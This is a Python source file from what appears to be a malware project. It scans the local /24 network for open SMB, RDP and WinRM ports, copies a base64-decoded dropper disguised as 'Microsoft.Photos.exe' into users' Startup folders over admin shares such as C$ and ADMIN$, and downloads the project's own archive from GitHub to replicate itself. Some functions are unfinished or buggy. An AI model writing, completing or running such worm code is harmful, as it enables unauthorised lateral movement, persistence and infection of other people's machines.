import base64
import ipaddress
import os
import socket
import string
import netifaces
from Utils.helpers import random_string, download_file,extract_zip,tempFolder,BaseTempFolder
def get_lan() -> set:
    """
    this function should return set of address of "nearby" ip by lan.
    //TODO 20: find better way to to this
    //TODO 21: WHY DA FUCK ONLY 192.168 OR 172.16?
    """
    interfaces = netifaces.interfaces()
    local_ip = set()
    for interface in interfaces:
        if interface == 'lo':
            continue
        iface = netifaces.ifaddresses(interface).get(netifaces.AF_INET)
        if iface != None:
            for j in iface:
                addr = str(j['addr'])
                if addr.startswith('192.168') or addr.startswith('172.16'):
                    local_ip.add(addr)
    return local_ip


def get_vuln_ports() -> dict:
    """
    This function should "scan" for open ports from the vuln_ports set.
    this is kind'a fucked up and would probably too noisy.
    the function return dict of {ip: "open_port,open_port"}
    //TODO 22: make it return list of port instead of string.
    //TODO 23: nmap ? XMAS? just find better way
    """
    vuln_ports = {'445', '3389', '5985'}
    clients = []
    vuln = dict()
    local_ip = get_lan()
    for addr in local_ip:
        range = ipaddress.ip_network(f"{addr.strip().split('.')[0]}.{addr.strip().split('.')[1]}.1.0/24")
        for ip in range.hosts():
            for port in vuln_ports:
                ip = str(ip)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                result = s.connect_ex((ip, int(port)))
                if result == 0:
                    if vuln.get(ip):
                        vuln[ip] += f',{port}'
                    else:
                        vuln[ip] = str(port)

    return vuln


def abuse_open_ports():
    """
    abuse the open ports with known CVE.
    //TODO 24: Create this
    """
    smb = '445'
    mstsc = '3389'
    ports = get_vuln_ports()
    for ip, open_ports in ports.items():
        open_ports = open_ports.strip().split(',')
        for port in open_ports:
            if port == smb:
                drop_on_share(ip)
            elif port == mstsc:
                pass
            else:
                pass
    return


def drop_on_share(ip : str, file,port=445) -> None:
    """

    :param ip: ip to parse
    :param file: base64 dropper
    :param port: 445
    :return: None

    so, we want to "explore" any existing or accessible share we got on the network.
    we can probably find much better way to do this
    //TODO 25: find better way to do this.
    """
    default_shares = [l + '$' for l in string.ascii_uppercase]
    default_shares.append('ADMIN$')
    cl = file
    exclude_users = ['Default', 'Public', 'All']
    for share in default_shares:
        try:
            a = os.chdir(f"//{ip}/{share}")
            if share == 'C$' or 'Users' in os.listdir():
                for user in os.listdir('Users'):
                    if any(i for i in exclude_users not in user):
                        os.makedirs(
                            f"//{ip}/{share}/users/{user}/appdata/roaming/microsoft/windows/start menu/programs/startup/",
                            exist_ok=True)
                        os.chdir(
                            f"//{ip}/{share}/users/{user}/appdata/roaming/microsoft/windows/start menu/programs/startup/")
                        with open('Microsoft.Photos.exe', 'w+') as n:
                            n.write(base64.b64decode(cl).decode())

        except FileNotFoundError:
            continue
    return



def replicate():
    our_zip = "https://github.com/Cyb3rDud3/pyMal/archive/refs/heads/main.zip"
    path = tempFolder.format(os.getlogin(),random_string(is_random=True,is_zip=True))
    if download_file(path,our_zip):
        if extract_zip(BaseTempFolder.format(os.getlogin()),path):
            pass
        #install it with pyinstaller?
        # we should do this path ONLY if we compiled the bootloader and didn't succed in the usual ways

    return 0
